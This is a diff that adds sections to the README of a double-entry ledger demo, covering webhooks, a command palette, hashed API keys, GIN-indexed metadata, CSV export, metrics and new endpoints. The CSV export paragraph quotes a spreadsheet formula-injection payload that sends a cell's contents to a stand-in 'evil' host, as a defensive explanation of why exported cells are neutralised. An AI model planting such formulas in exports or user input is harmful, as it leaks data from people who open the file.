@@ -14,6 +14,18 @@ enforced by Postgres as well as by the application.
 Built as a demonstration of production-shaped engineering: the interesting parts
 are the invariants and where they live, not the CRUD.
 
+Every claim below that could be false is checked by deleting the line that
+makes it true and watching the suite fail. Remove the `.sort` that orders
+posting inserts and Postgres reports `40P01 deadlock detected`. Remove
+`SKIP LOCKED` and four webhook workers collapse to one. Connect as a role with
+`BYPASSRLS` and the health probe says so before a request is served.
+
+**Double-entry core** · pending/posted/archived with three balances · reversals
+· idempotency · keyset pagination · optimistic concurrency ·
+**row-level tenant isolation** · **webhooks** through a transactional outbox ·
+API key management · metadata with a GIN index · CSV export · Prometheus
+metrics · generated OpenAPI · ⌘K
+
 ![The overview, in dark mode: a trial-balance banner reading "The books balance", headline figures, a 30-day posting-volume chart, and the accounting equation by account class](docs/screenshots/overview-dark.png)
 
 <details>
@@ -40,6 +52,21 @@ domain layer and a deferred Postgres constraint each check it again. A rejected
 submit keeps every field exactly as typed and moves focus to the error.
 
 ![The entry composer with a balanced two-line entry and a green "Balanced" badge](docs/screenshots/compose-light.png)
+
+**Webhooks.** Every delivery attempt with the subscriber's own status code and
+response excerpt, the endpoint's circuit-breaker state, and a button that runs
+the dispatcher on demand — the deployment's plan fires its cron once a day, and
+a queue you cannot watch drain is not a demo.
+
+![The webhooks page: a registered endpoint, a delivery log with a pending attempt, and the registration form listing every event type](docs/screenshots/webhooks-light.png)
+
+**⌘K.** A combobox, not a menu: the input keeps focus the whole time and
+describes the active option through `aria-activedescendant`, which is what
+makes it usable by screen reader as well as by keyboard. Accounts, entries and
+pages in one list, because the person typing does not know which of the three
+their reference lives in.
+
+![The command palette open over the chart of accounts, showing a matching account with its balance and six matching entries with their dates and statuses](docs/screenshots/palette-dark.png)
 
 **Light mode.** Not an inversion — the dark steps were chosen against the dark
 surface, which is why neither theme has the washed-out greys an algorithmic
@@ -230,6 +257,37 @@ and the deferred constraint are exercised as they will be in production.
 284 tests · 21 files · ~59s · no external services
 ```
 
+### The parts a product needs and a demo skips
+
+**Credentials you can rotate.** Keys are stored as SHA-256 digests and shown
+once. Each keeps an identifying prefix in the clear, which is what makes
+revoking the _right_ key possible — without it a management screen can only
+offer the name someone typed months ago. The `obol_sk_` prefix is not
+decoration either: secret scanners match on distinctive prefixes, so a key
+pasted into a public repository can be found and revoked automatically.
+Revocation keeps the row, because a deleted one answers "who had access, and
+until when?" with silence.
+
+**Metadata that is actually searchable.** The invoice number lives in the
+caller's world, and without somewhere to put it they keep a parallel table
+mapping their ids to ours — one more thing that can disagree with the ledger.
+Indexed with `GIN (metadata jsonb_path_ops)`: the containment lookup runs in
+0.26 ms reading 5 buffers where the `->>` form most people write first takes
+8.71 ms across three parallel workers reading 4,653. Both plans are in
+[benchmarks](docs/benchmarks.md).
+
+**Exports that survive Excel.** A cell beginning `=` is a _formula_ to Excel,
+Sheets and LibreOffice, so an entry described
+`=HYPERLINK("http://evil/?"&A1,"Click")` exfiltrates the row beside it — and on
+a ledger the attacker's input channel is "type a description". Cells are
+neutralised, the file opens with a UTF-8 BOM so Excel does not mangle every
+accented name, and it streams rather than being assembled in memory.
+
+**Metrics with one alertable number.** `obol_ledger_residual_minor` has exactly
+one correct value, forever, in every currency: zero. It cannot false-positive
+on a traffic spike, which makes it the rare gauge worth waking someone for. See
+[observability](docs/observability.md) for both alerts and their runbooks.
+
 ## Stack
 
 |                |                                                                                                                                   |
@@ -315,6 +373,17 @@ as extension members so nothing has to be parsed out of prose:
 | `POST /api/v1/entries`                | bearer | record a balanced entry                   |
 | `POST /api/v1/transfers`              | bearer | sugar for a two-legged entry              |
 | `GET /api/v1/reports/trial-balance`   | public | debits, credits and residual per currency |
+| `GET /api/v1/webhook-endpoints`       | public | registered subscribers                    |
+| `POST /api/v1/webhook-endpoints`      | bearer | register one; the secret is shown once    |
+| `GET /api/v1/webhook-deliveries`      | public | every attempt, with its status and error  |
+| `GET /api/v1/api-keys`                | bearer | this tenant's credentials                 |
+| `POST /api/v1/api-keys`               | bearer | issue one; the token is shown once        |
+| `DELETE /api/v1/api-keys/{id}`        | bearer | revoke, keeping the row for the audit     |
+| `GET /api/v1/metrics`                 | public | Prometheus text format                    |
+
+Any listing takes `?format=csv` and streams a download instead. Full details,
+including the metadata filter and every problem type, are in the
+[OpenAPI document](https://obol-ledger.vercel.app/api/openapi.json).
 
 ## Documentation
 
